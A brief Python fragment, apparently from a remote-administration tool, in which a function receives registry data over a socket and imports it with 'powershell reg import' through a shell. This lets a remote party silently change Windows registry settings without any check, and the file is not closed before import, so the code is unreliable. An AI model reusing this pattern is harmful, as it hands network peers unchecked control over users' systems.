from tkinter import *

def ReceiveRegistry(Client):
    import subprocess    
    Client.sendall(bytes("Confirm","utf-8"))
    data = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Confirm","utf-8"))
    fileopen = open("File.reg","w")
    fileopen.write(data)
    cmd = 'powershell reg import File.reg'
    subprocess.Popen(cmd, shell=True)
